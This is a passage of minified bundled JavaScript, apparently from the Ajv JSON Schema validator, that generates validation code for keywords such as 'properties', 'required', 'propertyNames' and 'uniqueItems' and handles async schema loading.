 ",F)G+="validate.schema"+V;else G+=""+Y.util.toQuotedString(K);G+="         , parentSchema: validate.schema"+Y.schemaPath+" , data: "+M+" "}G+=" } "}else G+=" {} ";var A=G;if(G=N.pop(),!Y.compositeRule&&Z)if(Y.async)G+=" throw new ValidationError(["+A+"]); ";else G+=" validate.errors = ["+A+"]; return false; ";else G+=" var err = "+A+";  if (vErrors === null) vErrors = [err]; else vErrors.push(err); errors++; ";if(G+="} ",Z)G+=" else { ";return G}}),qf1=Y0((X,J)=>{J.exports=function Q(Y,W,z){var G=" ",H=Y.level,U=Y.dataLevel,K=Y.schema[W],V=Y.schemaPath+Y.util.getProperty(W),B=Y.errSchemaPath+"/"+W,Z=!Y.opts.allErrors,M="data"+(U||""),F="errs__"+H,j=Y.util.copy(Y),O="";j.level++;var N="valid"+j.level,A="key"+H,D="idx"+H,S=j.dataLevel=Y.dataLevel+1,$="data"+S,T="dataProperties"+H,k=Object.keys(K||{}).filter(z1),E=Y.schema.patternProperties||{},y=Object.keys(E).filter(z1),a=Y.schema.additionalProperties,p=k.length||y.length,f=a===!1,m=typeof a=="object"&&Object.keys(a).length,o=Y.opts.removeAdditional,J1=f||m||o,H1=Y.opts.ownProperties,d=Y.baseId,Q1=Y.schema.required;if(Q1&&!(Y.opts.$data&&Q1.$data)&&Q1.length<Y.opts.loopRequired)var u=Y.util.toHash(Q1);function z1(s0){return s0!=="__proto__"}if(G+="var "+F+" = errors;var "+N+" = true;",H1)G+=" var "+T+" = undefined;";if(J1){if(H1)G+=" "+T+" = "+T+" || Object.keys("+M+"); for (var "+D+"=0; "+D+"<"+T+".length; "+D+"++) { var "+A+" = "+T+"["+D+"]; ";else G+=" for (var "+A+" in "+M+") { ";if(p){if(G+=" var isAdditional"+H+" = !(false ",k.length)if(k.length>8)G+=" || validate.schema"+V+".hasOwnProperty("+A+") ";else{var B1=k;if(B1){var N1,i1=-1,d1=B1.length-1;while(i1<d1)N1=B1[i1+=1],G+=" || "+A+" == "+Y.util.toQuotedString(N1)+" "}}if(y.length){var X0=y;if(X0){var b1,S1=-1,g=X0.length-1;while(S1<g)b1=X0[S1+=1],G+=" || "+Y.usePattern(b1)+".test("+A+") "}}G+=" ); if (isAdditional"+H+") { "}if(o=="all")G+=" delete "+M+"["+A+"]; ";else{var X1=Y.errorPath,V1="' + "+A+" + '";if(Y.opts._errorDataPathProperty)Y.errorPath=Y.util.getPathExpr(Y.errorPath,A,Y.opts.jsonPointers);if(f)if(o)G+=" delete "+M+"["+A+"]; ";else{G+=" "+N+" = false; ";var n=B;B=Y.errSchemaPath+"/additionalProperties";var r=r||[];if(r.push(G),G="",Y.createErrors!==!1){if(G+=" { keyword: 'additionalProperties' , dataPath: (dataPath || '') + "+Y.errorPath+" , schemaPath: "+Y.util.toQuotedString(B)+" , params: { additionalProperty: '"+V1+"' } ",Y.opts.messages!==!1){if(G+=" , message: '",Y.opts._errorDataPathProperty)G+="is an invalid additional property";else G+="should NOT have additional properties";G+="' "}if(Y.opts.verbose)G+=" , schema: false , parentSchema: validate.schema"+Y.schemaPath+" , data: "+M+" ";G+=" } "}else G+=" {} ";var G1=G;if(G=r.pop(),!Y.compositeRule&&Z)if(Y.async)G+=" throw new ValidationError(["+G1+"]); ";else G+=" validate.errors = ["+G1+"]; return false; ";else G+=" var err = "+G1+";  if (vErrors === null) vErrors = [err]; else vErrors.push(err); errors++; ";if(B=n,Z)G+=" break; "}else if(m)if(o=="failing"){G+=" var "+F+" = errors;  ";var $1=Y.compositeRule;Y.compositeRule=j.compositeRule=!0,j.schema=a,j.schemaPath=Y.schemaPath+".additionalProperties",j.errSchemaPath=Y.errSchemaPath+"/additionalProperties",j.errorPath=Y.opts._errorDataPathProperty?Y.errorPath:Y.util.getPathExpr(Y.errorPath,A,Y.opts.jsonPointers);var m1=M+"["+A+"]";j.dataPathArr[S]=A;var t=Y.validate(j);if(j.baseId=d,Y.util.varOccurences(t,$)<2)G+=" "+Y.util.varReplace(t,$,m1)+" ";else G+=" var "+$+" = "+m1+"; "+t+" ";G+=" if (!"+N+") { errors = "+F+"; if (validate.errors !== null) { if (errors) validate.errors.length = errors; else validate.errors = null; } delete "+M+"["+A+"]; }  ",Y.compositeRule=j.compositeRule=$1}else{j.schema=a,j.schemaPath=Y.schemaPath+".additionalProperties",j.errSchemaPath=Y.errSchemaPath+"/additionalProperties",j.errorPath=Y.opts._errorDataPathProperty?Y.errorPath:Y.util.getPathExpr(Y.errorPath,A,Y.opts.jsonPointers);var m1=M+"["+A+"]";j.dataPathArr[S]=A;var t=Y.validate(j);if(j.baseId=d,Y.util.varOccurences(t,$)<2)G+=" "+Y.util.varReplace(t,$,m1)+" ";else G+=" var "+$+" = "+m1+"; "+t+" ";if(Z)G+=" if (!"+N+") break; "}Y.errorPath=X1}if(p)G+=" } ";if(G+=" }  ",Z)G+=" if ("+N+") { ",O+="}"}var Y1=Y.opts.useDefaults&&!Y.compositeRule;if(k.length){var Z1=k;if(Z1){var N1,M1=-1,g1=Z1.length-1;while(M1<g1){N1=Z1[M1+=1];var k1=K[N1];if(Y.opts.strictKeywords?typeof k1=="object"&&Object.keys(k1).length>0||k1===!1:Y.util.schemaHasRules(k1,Y.RULES.all)){var J0=Y.util.getProperty(N1),m1=M+J0,W0=Y1&&k1.default!==void 0;j.schema=k1,j.schemaPath=V+J0,j.errSchemaPath=B+"/"+Y.util.escapeFragment(N1),j.errorPath=Y.util.getPath(Y.errorPath,N1,Y.opts.jsonPointers),j.dataPathArr[S]=Y.util.toQuotedString(N1);var t=Y.validate(j);if(j.baseId=d,Y.util.varOccurences(t,$)<2){t=Y.util.varReplace(t,$,m1);var I0=m1}else{var I0=$;G+=" var "+$+" = "+m1+"; "}if(W0)G+=" "+t+" ";else{if(u&&u[N1]){if(G+=" if ( "+I0+" === undefined ",H1)G+=" || ! Object.prototype.hasOwnProperty.call("+M+", '"+Y.util.escapeQuotes(N1)+"') ";G+=") { "+N+" = false; ";var X1=Y.errorPath,n=B,G9=Y.util.escapeQuotes(N1);if(Y.opts._errorDataPathProperty)Y.errorPath=Y.util.getPath(X1,N1,Y.opts.jsonPointers);B=Y.errSchemaPath+"/required";var r=r||[];if(r.push(G),G="",Y.createErrors!==!1){if(G+=" { keyword: 'required' , dataPath: (dataPath || '') + "+Y.errorPath+" , schemaPath: "+Y.util.toQuotedString(B)+" , params: { missingProperty: '"+G9+"' } ",Y.opts.messages!==!1){if(G+=" , message: '",Y.opts._errorDataPathProperty)G+="is a required property";else G+="should have required property \\'"+G9+"\\'";G+="' "}if(Y.opts.verbose)G+=" , schema: validate.schema"+V+" , parentSchema: validate.schema"+Y.schemaPath+" , data: "+M+" ";G+=" } "}else G+=" {} ";var G1=G;if(G=r.pop(),!Y.compositeRule&&Z)if(Y.async)G+=" throw new ValidationError(["+G1+"]); ";else G+=" validate.errors = ["+G1+"]; return false; ";else G+=" var err = "+G1+";  if (vErrors === null) vErrors = [err]; else vErrors.push(err); errors++; ";B=n,Y.errorPath=X1,G+=" } else { "}else if(Z){if(G+=" if ( "+I0+" === undefined ",H1)G+=" || ! Object.prototype.hasOwnProperty.call("+M+", '"+Y.util.escapeQuotes(N1)+"') ";G+=") { "+N+" = true; } else { "}else{if(G+=" if ("+I0+" !== undefined ",H1)G+=" &&   Object.prototype.hasOwnProperty.call("+M+", '"+Y.util.escapeQuotes(N1)+"') ";G+=" ) { "}G+=" "+t+" } "}}if(Z)G+=" if ("+N+") { ",O+="}"}}}if(y.length){var a0=y;if(a0){var b1,e9=-1,y8=a0.length-1;while(e9<y8){b1=a0[e9+=1];var k1=E[b1];if(Y.opts.strictKeywords?typeof k1=="object"&&Object.keys(k1).length>0||k1===!1:Y.util.schemaHasRules(k1,Y.RULES.all)){if(j.schema=k1,j.schemaPath=Y.schemaPath+".patternProperties"+Y.util.getProperty(b1),j.errSchemaPath=Y.errSchemaPath+"/patternProperties/"+Y.util.escapeFragment(b1),H1)G+=" "+T+" = "+T+" || Object.keys("+M+"); for (var "+D+"=0; "+D+"<"+T+".length; "+D+"++) { var "+A+" = "+T+"["+D+"]; ";else G+=" for (var "+A+" in "+M+") { ";G+=" if ("+Y.usePattern(b1)+".test("+A+")) { ",j.errorPath=Y.util.getPathExpr(Y.errorPath,A,Y.opts.jsonPointers);var m1=M+"["+A+"]";j.dataPathArr[S]=A;var t=Y.validate(j);if(j.baseId=d,Y.util.varOccurences(t,$)<2)G+=" "+Y.util.varReplace(t,$,m1)+" ";else G+=" var "+$+" = "+m1+"; "+t+" ";if(Z)G+=" if (!"+N+") break; ";if(G+=" } ",Z)G+=" else "+N+" = true; ";if(G+=" }  ",Z)G+=" if ("+N+") { ",O+="}"}}}}if(Z)G+=" "+O+" if ("+F+" == errors) {";return G}}),Zf1=Y0((X,J)=>{J.exports=function Q(Y,W,z){var G=" ",H=Y.level,U=Y.dataLevel,K=Y.schema[W],V=Y.schemaPath+Y.util.getProperty(W),B=Y.errSchemaPath+"/"+W,Z=!Y.opts.allErrors,M="data"+(U||""),F="errs__"+H,j=Y.util.copy(Y),O="";j.level++;var N="valid"+j.level;if(G+="var "+F+" = errors;",Y.opts.strictKeywords?typeof K=="object"&&Object.keys(K).length>0||K===!1:Y.util.schemaHasRules(K,Y.RULES.all)){j.schema=K,j.schemaPath=V,j.errSchemaPath=B;var A="key"+H,D="idx"+H,S="i"+H,$="' + "+A+" + '",T=j.dataLevel=Y.dataLevel+1,k="data"+T,E="dataProperties"+H,y=Y.opts.ownProperties,a=Y.baseId;if(y)G+=" var "+E+" = undefined; ";if(y)G+=" "+E+" = "+E+" || Object.keys("+M+"); for (var "+D+"=0; "+D+"<"+E+".length; "+D+"++) { var "+A+" = "+E+"["+D+"]; ";else G+=" for (var "+A+" in "+M+") { ";G+=" var startErrs"+H+" = errors; ";var p=A,f=Y.compositeRule;Y.compositeRule=j.compositeRule=!0;var m=Y.validate(j);if(j.baseId=a,Y.util.varOccurences(m,k)<2)G+=" "+Y.util.varReplace(m,k,p)+" ";else G+=" var "+k+" = "+p+"; "+m+" ";if(Y.compositeRule=j.compositeRule=f,G+=" if (!"+N+") { for (var "+S+"=startErrs"+H+"; "+S+"<errors; "+S+"++) { vErrors["+S+"].propertyName = "+A+"; }   var err =   ",Y.createErrors!==!1){if(G+=" { keyword: 'propertyNames' , dataPath: (dataPath || '') + "+Y.errorPath+" , schemaPath: "+Y.util.toQuotedString(B)+" , params: { propertyName: '"+$+"' } ",Y.opts.messages!==!1)G+=" , message: 'property name \\'"+$+"\\' is invalid' ";if(Y.opts.verbose)G+=" , schema: validate.schema"+V+" , parentSchema: validate.schema"+Y.schemaPath+" , data: "+M+" ";G+=" } "}else G+=" {} ";if(G+=";  if (vErrors === null) vErrors = [err]; else vErrors.push(err); errors++; ",!Y.compositeRule&&Z)if(Y.async)G+=" throw new ValidationError(vErrors); ";else G+=" validate.errors = vErrors; return false; ";if(Z)G+=" break; ";G+=" } }"}if(Z)G+=" "+O+" if ("+F+" == errors) {";return G}}),Mf1=Y0((X,J)=>{J.exports=function Q(Y,W,z){var G=" ",H=Y.level,U=Y.dataLevel,K=Y.schema[W],V=Y.schemaPath+Y.util.getProperty(W),B=Y.errSchemaPath+"/"+W,Z=!Y.opts.allErrors,M="data"+(U||""),F="valid"+H,j=Y.opts.$data&&K&&K.$data,O;if(j)G+=" var schema"+H+" = "+Y.util.getData(K.$data,U,Y.dataPathArr)+"; ",O="schema"+H;else O=K;var N="schema"+H;if(!j)if(K.length<Y.opts.loopRequired&&Y.schema.properties&&Object.keys(Y.schema.properties).length){var A=[],D=K;if(D){var S,$=-1,T=D.length-1;while($<T){S=D[$+=1];var k=Y.schema.properties[S];if(!(k&&(Y.opts.strictKeywords?typeof k=="object"&&Object.keys(k).length>0||k===!1:Y.util.schemaHasRules(k,Y.RULES.all))))A[A.length]=S}}}else var A=K;if(j||A.length){var E=Y.errorPath,y=j||A.length>=Y.opts.loopRequired,a=Y.opts.ownProperties;if(Z)if(G+=" var missing"+H+"; ",y){if(!j)G+=" var "+N+" = validate.schema"+V+"; ";var p="i"+H,f="schema"+H+"["+p+"]",m="' + "+f+" + '";if(Y.opts._errorDataPathProperty)Y.errorPath=Y.util.getPathExpr(E,f,Y.opts.jsonPointers);if(G+=" var "+F+" = true; ",j)G+=" if (schema"+H+" === undefined) "+F+" = true; else if (!Array.isArray(schema"+H+")) "+F+" = false; else {";if(G+=" for (var "+p+" = 0; "+p+" < "+N+".length; "+p+"++) { "+F+" = "+M+"["+N+"["+p+"]] !== undefined ",a)G+=" &&   Object.prototype.hasOwnProperty.call("+M+", "+N+"["+p+"]) ";if(G+="; if (!"+F+") break; } ",j)G+="  }  ";G+="  if (!"+F+") {   ";var o=o||[];if(o.push(G),G="",Y.createErrors!==!1){if(G+=" { keyword: 'required' , dataPath: (dataPath || '') + "+Y.errorPath+" , schemaPath: "+Y.util.toQuotedString(B)+" , params: { missingProperty: '"+m+"' } ",Y.opts.messages!==!1){if(G+=" , message: '",Y.opts._errorDataPathProperty)G+="is a required property";else G+="should have required property \\'"+m+"\\'";G+="' "}if(Y.opts.verbose)G+=" , schema: validate.schema"+V+" , parentSchema: validate.schema"+Y.schemaPath+" , data: "+M+" ";G+=" } "}else G+=" {} ";var J1=G;if(G=o.pop(),!Y.compositeRule&&Z)if(Y.async)G+=" throw new ValidationError(["+J1+"]); ";else G+=" validate.errors = ["+J1+"]; return false; ";else G+=" var err = "+J1+";  if (vErrors === null) vErrors = [err]; else vErrors.push(err); errors++; ";G+=" } else { "}else{G+=" if ( ";var H1=A;if(H1){var d,p=-1,Q1=H1.length-1;while(p<Q1){if(d=H1[p+=1],p)G+=" || ";var u=Y.util.getProperty(d),z1=M+u;if(G+=" ( ( "+z1+" === undefined ",a)G+=" || ! Object.prototype.hasOwnProperty.call("+M+", '"+Y.util.escapeQuotes(d)+"') ";G+=") && (missing"+H+" = "+Y.util.toQuotedString(Y.opts.jsonPointers?d:u)+") ) "}}G+=") {  ";var f="missing"+H,m="' + "+f+" + '";if(Y.opts._errorDataPathProperty)Y.errorPath=Y.opts.jsonPointers?Y.util.getPathExpr(E,f,!0):E+" + "+f;var o=o||[];if(o.push(G),G="",Y.createErrors!==!1){if(G+=" { keyword: 'required' , dataPath: (dataPath || '') + "+Y.errorPath+" , schemaPath: "+Y.util.toQuotedString(B)+" , params: { missingProperty: '"+m+"' } ",Y.opts.messages!==!1){if(G+=" , message: '",Y.opts._errorDataPathProperty)G+="is a required property";else G+="should have required property \\'"+m+"\\'";G+="' "}if(Y.opts.verbose)G+=" , schema: validate.schema"+V+" , parentSchema: validate.schema"+Y.schemaPath+" , data: "+M+" ";G+=" } "}else G+=" {} ";var J1=G;if(G=o.pop(),!Y.compositeRule&&Z)if(Y.async)G+=" throw new ValidationError(["+J1+"]); ";else G+=" validate.errors = ["+J1+"]; return false; ";else G+=" var err = "+J1+";  if (vErrors === null) vErrors = [err]; else vErrors.push(err); errors++; ";G+=" } else { "}else if(y){if(!j)G+=" var "+N+" = validate.schema"+V+"; ";var p="i"+H,f="schema"+H+"["+p+"]",m="' + "+f+" + '";if(Y.opts._errorDataPathProperty)Y.errorPath=Y.util.getPathExpr(E,f,Y.opts.jsonPointers);if(j){if(G+=" if ("+N+" && !Array.isArray("+N+")) {  var err =   ",Y.createErrors!==!1){if(G+=" { keyword: 'required' , dataPath: (dataPath || '') + "+Y.errorPath+" , schemaPath: "+Y.util.toQuotedString(B)+" , params: { missingProperty: '"+m+"' } ",Y.opts.messages!==!1){if(G+=" , message: '",Y.opts._errorDataPathProperty)G+="is a required property";else G+="should have required property \\'"+m+"\\'";G+="' "}if(Y.opts.verbose)G+=" , schema: validate.schema"+V+" , parentSchema: validate.schema"+Y.schemaPath+" , data: "+M+" ";G+=" } "}else G+=" {} ";G+=";  if (vErrors === null) vErrors = [err]; else vErrors.push(err); errors++; } else if ("+N+" !== undefined) { "}if(G+=" for (var "+p+" = 0; "+p+" < "+N+".length; "+p+"++) { if ("+M+"["+N+"["+p+"]] === undefined ",a)G+=" || ! Object.prototype.hasOwnProperty.call("+M+", "+N+"["+p+"]) ";if(G+=") {  var err =   ",Y.createErrors!==!1){if(G+=" { keyword: 'required' , dataPath: (dataPath || '') + "+Y.errorPath+" , schemaPath: "+Y.util.toQuotedString(B)+" , params: { missingProperty: '"+m+"' } ",Y.opts.messages!==!1){if(G+=" , message: '",Y.opts._errorDataPathProperty)G+="is a required property";else G+="should have required property \\'"+m+"\\'";G+="' "}if(Y.opts.verbose)G+=" , schema: validate.schema"+V+" , parentSchema: validate.schema"+Y.schemaPath+" , data: "+M+" ";G+=" } "}else G+=" {} ";if(G+=";  if (vErrors === null) vErrors = [err]; else vErrors.push(err); errors++; } } ",j)G+="  }  "}else{var B1=A;if(B1){var d,N1=-1,i1=B1.length-1;while(N1<i1){d=B1[N1+=1];var u=Y.util.getProperty(d),m=Y.util.escapeQuotes(d),z1=M+u;if(Y.opts._errorDataPathProperty)Y.errorPath=Y.util.getPath(E,d,Y.opts.jsonPointers);if(G+=" if ( "+z1+" === undefined ",a)G+=" || ! Object.prototype.hasOwnProperty.call("+M+", '"+Y.util.escapeQuotes(d)+"') ";if(G+=") {  var err =   ",Y.createErrors!==!1){if(G+=" { keyword: 'required' , dataPath: (dataPath || '') + "+Y.errorPath+" , schemaPath: "+Y.util.toQuotedString(B)+" , params: { missingProperty: '"+m+"' } ",Y.opts.messages!==!1){if(G+=" , message: '",Y.opts._errorDataPathProperty)G+="is a required property";else G+="should have required property \\'"+m+"\\'";G+="' "}if(Y.opts.verbose)G+=" , schema: validate.schema"+V+" , parentSchema: validate.schema"+Y.schemaPath+" , data: "+M+" ";G+=" } "}else G+=" {} ";G+=";  if (vErrors === null) vErrors = [err]; else vErrors.push(err); errors++; } "}}}Y.errorPath=E}else if(Z)G+=" if (true) {";return G}}),Ff1=Y0((X,J)=>{J.exports=function Q(Y,W,z){var G=" ",H=Y.level,U=Y.dataLevel,K=Y.schema[W],V=Y.schemaPath+Y.util.getProperty(W),B=Y.errSchemaPath+"/"+W,Z=!Y.opts.allErrors,M="data"+(U||""),F="valid"+H,j=Y.opts.$data&&K&&K.$data,O;if(j)G+=" var schema"+H+" = "+Y.util.getData(K.$data,U,Y.dataPathArr)+"; ",O="schema"+H;else O=K;if((K||j)&&Y.opts.uniqueItems!==!1){if(j)G+=" var "+F+"; if ("+O+" === false || "+O+" === undefined) "+F+" = true; else if (typeof "+O+" != 'boolean') "+F+" = false; else { ";G+=" var i = "+M+".length , "+F+" = true , j; if (i > 1) { ";var N=Y.schema.items&&Y.schema.items.type,A=Array.isArray(N);if(!N||N=="object"||N=="array"||A&&(N.indexOf("object")>=0||N.indexOf("array")>=0))G+=" outer: for (;i--;) { for (j = i; j--;) { if (equal("+M+"[i], "+M+"[j])) { "+F+" = false; break outer; } } } ";else{G+=" var itemIndices = {}, item; for (;i--;) { var item = "+M+"[i]; ";var D="checkDataType"+(A?"s":"");if(G+=" if ("+Y.util[D](N,"item",Y.opts.strictNumbers,!0)+") continue; ",A)G+=` if (typeof item == 'string') item = '"' + item; `;G+=" if (typeof itemIndices[item] == 'number') { "+F+" = false; j = itemIndices[item]; break; } itemIndices[item] = i; } "}if(G+=" } ",j)G+="  }  ";G+=" if (!"+F+") {   ";var S=S||[];if(S.push(G),G="",Y.createErrors!==!1){if(G+=" { keyword: 'uniqueItems' , dataPath: (dataPath || '') + "+Y.errorPath+" , schemaPath: "+Y.util.toQuotedString(B)+" , params: { i: i, j: j } ",Y.opts.messages!==!1)G+=" , message: 'should NOT have duplicate items (items ## ' + j + ' and ' + i + ' are identical)' ";if(Y.opts.verbose){if(G+=" , schema:  ",j)G+="validate.schema"+V;else G+=""+K;G+="         , parentSchema: validate.schema"+Y.schemaPath+" , data: "+M+" "}G+=" } "}else G+=" {} ";var $=G;if(G=S.pop(),!Y.compositeRule&&Z)if(Y.async)G+=" throw new ValidationError(["+$+"]); ";else G+=" validate.errors = ["+$+"]; return false; ";else G+=" var err = "+$+";  if (vErrors === null) vErrors = [err]; else vErrors.push(err); errors++; ";if(G+=" } ",Z)G+=" else { "}else if(Z)G+=" if (true) { ";return G}}),jf1=Y0((X,J)=>{J.exports={$ref:ox1(),allOf:tx1(),anyOf:ex1(),$comment:Xf1(),const:Jf1(),contains:Qf1(),dependencies:Yf1(),enum:Wf1(),format:Gf1(),if:zf1(),items:Hf1(),maximum:ZN(),minimum:ZN(),maxItems:MN(),minItems:MN(),maxLength:FN(),minLength:FN(),maxProperties:jN(),minProperties:jN(),multipleOf:Uf1(),not:Kf1(),oneOf:Vf1(),pattern:Bf1(),properties:qf1(),propertyNames:Zf1(),required:Mf1(),uniqueItems:Ff1(),validate:$N()}}),Of1=Y0((X,J)=>{var Q=jf1(),Y=w7().toHash;J.exports=function W(){var z=[{type:"number",rules:[{maximum:["exclusiveMaximum"]},{minimum:["exclusiveMinimum"]},"multipleOf","format"]},{type:"string",rules:["maxLength","minLength","pattern","format"]},{type:"array",rules:["maxItems","minItems","items","contains","uniqueItems"]},{type:"object",rules:["maxProperties","minProperties","required","dependencies","propertyNames",{properties:["additionalProperties","patternProperties"]}]},{rules:["$ref","const","enum","not","anyOf","oneOf","allOf","if"]}],G=["type","$comment"],H=["$schema","$id","id","$data","$async","title","description","default","definitions","examples","readOnly","writeOnly","contentMediaType","contentEncoding","additionalItems","then","else"],U=["number","integer","string","array","object","boolean","null"];return z.all=Y(G),z.types=Y(U),z.forEach(function(K){if(K.rules=K.rules.map(function(V){var B;if(typeof V=="object"){var Z=Object.keys(V)[0];B=V[Z],V=Z,B.forEach(function(F){G.push(F),z.all[F]=!0})}G.push(V);var M=z.all[V]={keyword:V,code:Q[V],implements:B};return M}),z.all.$comment={keyword:"$comment",code:Q.$comment},K.type)z.types[K.type]=K}),z.keywords=Y(G.concat(H)),z.custom={},z}}),Rf1=Y0((X,J)=>{var Q=["multipleOf","maximum","exclusiveMaximum","minimum","exclusiveMinimum","maxLength","minLength","pattern","additionalItems","maxItems","minItems","uniqueItems","maxProperties","minProperties","required","additionalProperties","enum","format","const"];J.exports=function(Y,W){for(var z=0;z<W.length;z++){Y=JSON.parse(JSON.stringify(Y));var G=W[z].split("/"),H=Y,U;for(U=1;U<G.length;U++)H=H[G[U]];for(U=0;U<Q.length;U++){var K=Q[U],V=H[K];if(V)H[K]={anyOf:[V,{$ref:"https://raw.githubusercontent.com/ajv-validator/ajv/master/lib/refs/data.json#"}]}}}return Y}}),Af1=Y0((X,J)=>{var Q=ZH().MissingRef;J.exports=Y;function Y(W,z,G){var H=this;if(typeof this._opts.loadSchema!="function")throw new Error("options.loadSchema should be a function");if(typeof z=="function")G=z,z=void 0;var U=K(W).then(function(){var B=H._addSchema(W,void 0,z);return B.validate||V(B)});if(G)U.then(function(B){G(null,B)},G);return U;function K(B){var Z=B.$schema;return Z&&!H.getSchema(Z)?Y.call(H,{$ref:Z},!0):Promise.resolve()}function V(B){try{return H._compile(B)}catch(M){if(M instanceof Q)return Z(M);throw M}function Z(M){var F=M.missingSchema;if(N(F))throw new Error("Schema "+F+" is loaded but "+M.missingRef+" cannot be resolved");var j=H._loadingSchemas[F];if(!j)j=H._loadingSchemas[F]=H._opts.loadSchema(F),j.then(O,O);return j.then(function(A){if(!N(F))return K(A).then(function(){if(!N(F))H.addSchema(A,F,void 0,z)})}).then(function(){return V(B)});function O(){delete H._loadingSchemas[F]}function N(A){return H._refs[A]||H._schemas[A]}}}}}),Nf1=Y0((X,J)=>{J.exports=function Q(Y,W,z){var G=" ",H=Y.level,U=Y.dataLevel,K=Y.schema[W],V=Y.schemaPath+Y.util.getProperty(W),B=Y.errSchemaPath+"/"+W,Z=!Y.opts.allErrors,M,F="data"+(U||""),j="valid"+H,O="errs__"+H,N=Y.opts.$data&&K&&K.$data,A;if(N)G+=" var schema"+H+" = "+Y.util.getData(K.$data,U,Y.dataPathArr)+"; ",A="schema"+H;else A=K;var D=this,S="definition"+H,$=D.definition,T="",k,E,y,a,p;if(N&&$.$data){p="keywordValidate"+H;var f=$.validateSchema;G+=" var "+S+" = RULES.custom['"+W+"'].definition; var "+p+" = "+S+".validate;"}else{if(a=Y.useCustomRule(D,K,Y.schema,Y),!a)return;A="validate.schema"+V,p=a.code,k=$.compile,E=$.inline,y=$.macro}var m=p+".errors",o="i"+H,J1="ruleErr"+H,H1=$.async;if(H1&&!Y.async)throw new Error("async keyword in sync schema");if(!(E||y))G+=""+m+" = null;";if(G+="var "+O+" = errors;var "+j+";",N&&$.$data){if(T+="}",G+=" if ("+A+" === undefined) { "+j+" = true; } else { ",f)T+="}",G+=" "+j+" = "+S+".validateSchema("+A+"); if ("+j+") { "}if(E)if($.statements)G+=" "+a.validate+" ";else G+=" "+j+" = "+a.validate+"; ";else if(y){var d=Y.util.copy(Y),T="";d.level++;var Q1="valid"+d.level;d.schema=a.validate,d.schemaPath="";var u=Y.compositeRule;Y.compositeRule=d.compositeRule=!0;var z1=Y.validate(d).replace(/validate\.schema/g,p);Y.compositeRule=d.compositeRule=u,G+=" "+z1}else{var B1=B1||[];if(B1.push(G),G="",G+="  "+p+".call( ",Y.opts.passContext)G+="this";else G+="self";if(k||$.schema===!1)G+=" , "+F+" ";else G+=" , "+A+" , "+F+" , validate.schema"+Y.schemaPath+" ";if(G+=" , (dataPath || '')",Y.errorPath!='""')G+=" + "+Y.errorPath;var N1=U?"data"+(U-1||""):"parentData",i1=U?Y.dataPathArr[U]:"parentDataProperty";G+=" , "+N1+" , "+i1+" , rootData )  ";var d1=G;if(G=B1.pop(),$.errors===!1){if(G+=" "+j+" = ",H1)G+="await ";G+=""+d1+"; "}else if(H1)m="customErrors"+H,G+=" var "+m+" = null; try { "+j+" = await "+d1+"; } catch (e) { "+j+" = false; if (e instanceof ValidationError) "+m+" = e.errors; else throw e; } ";else G+=" "+m+" = null; "+j+" = "+d1+"; "}if($.modifying)G+=" if ("+N1+") "+F+" = "+N1+"["+i1+"];";if(G+=""+T,$.valid){if(Z)G+=" if (true) { "}else{if(G+=" if ( ",$.valid===void 0)if(G+=" !",y)G+=""+Q1;else G+=""+j;else G+=" "+!$.valid+" ";G+=") { ",M=D.keyword;var B1=B1||[];B1.push(G),G="";var B1=B1||[];if(B1.push(G),G="",Y.createErrors!==!1){if(G+=" { keyword: '"+(M||"custom")+"' , dataPath: (dataPath || '') + "+Y.errorPath+" , schemaPath: "+Y.util.toQuotedString(B)+" , params: { keyword: '"+D.keyword+"' } ",Y.opts.messages!==!1)G+=` , message: 'should pass "`+D.keyword+`" keyword validation' `;if(Y.opts.verbose)G+=" , schema: validate.schema"+V+" , parentSchema: validate.schema"+Y.schemaPath+" , data: "+F+" ";G+=" } "}else G+=" {} ";var X0=G;if(G=B1.pop(),!Y.compositeRule&&Z)if(Y.async)G+=" throw new ValidationError(["+X0+"]); ";else G+=" validate.errors = ["+X0+"]; return false; ";else G+=" var err = "+X0+";  if (vErrors === null) vErrors = [err]; else vErrors.push(err); errors++; ";var b1=G;if(G=B1.pop(),E)if($.errors){if($.errors!="full"){if(G+="  for (var "+o+"="+O+"; "+o+"<errors; "+o+"++) { var "+J1+" = vErrors["+o+"]; if ("+J1+".dataPath === undefined) "+J1+".dataPath = (dataPath || '') + "+Y.errorPath+"; if ("+J1+".schemaPath === undefined) { "+J1+'.schemaPath = "'+B+'"; } ',Y.opts.verbose)G+=" "+J1+".schema = "+A+"; "+J1+".data = "+F+"; ";G+=" } "}}else if($.errors===!1)G+=" "+b1+" ";else{if(G+=" if ("+O+" == errors) { "+b1+" } else {  for (var "+o+"="+O+"; "+o+"<errors; "+o+"++) { var "+J1+" = vErrors["+o+"]; if ("+J1+".dataPath === undefined) "+J1+".dataPath = (dataPath || '') + "+Y.errorPath+"; if ("+J1+".schemaPath === undefined) { "+J1+'.schemaPath = "'+B+'"; } ',Y.opts.verbose)G+=" "+J1+".schema = "+A+"; "+J1+".data = "+F+"; ";G+=" } } "}else if(y){if(G+="   var err =   ",Y.createErrors!==!1){if(G+=" { keyword: '"+(M||"custom")+"' , dataPath: (dataPath || '') + "+Y.errorPath+" , schemaPath: "+Y.util.toQuotedString(B)+" , params: { keyword: '"+D.keyword+"' } ",Y.opts.messages!==!1)G+=` , message: 'should pass "`+D.keyword+`" keyword validation' `;if(Y.opts.verbose)G+=" , schema: validate.schema"+V+" , parentSchema: validate.schema"+Y.schemaPath+" , data: "+F+" ";G+=" } "}else G+=" {} ";if(G+=";  if (vErrors === null) vErrors = [err]; else vErrors.push(err); errors++; ",!Y.compositeRule&&Z)if(Y.async)G+=" throw new ValidationError(vErrors); ";else G+=" validate.errors = vErrors; return false; "}else if($.errors===!1)G+=" "+b1+" ";else{if(G+=" if (Array.isArray("+m+")) { if (vErrors === null) vErrors = "+m+"; else vErrors = vErrors.concat("+m+"); errors = vErrors.length;  for (var "+o+"="+O+"; "+o+"<errors; "+o+"++) { var "+J1+" = vErrors["+o+"]; if ("+J1+".dataPath === undefined) "+J1+".dataPath = (dataPath || '') + "+Y.errorPath+";  "+J1+'.schemaPath = "'+B+'";  ',Y.opts.verbose)G+=" "+J1+".schema = "+A+"; "+J1+".data = "+F+"; ";G+=" } } else { "+b1+" } "}if(G+=" } ",Z)G+=" else { "}return G}}),kN=Y0((X,J)=>{J.exports={$schema:"http://json-schema.org/draft-07/schema#",$id:"http://json-schema.org/draft-07/schema#",title:"Core schema 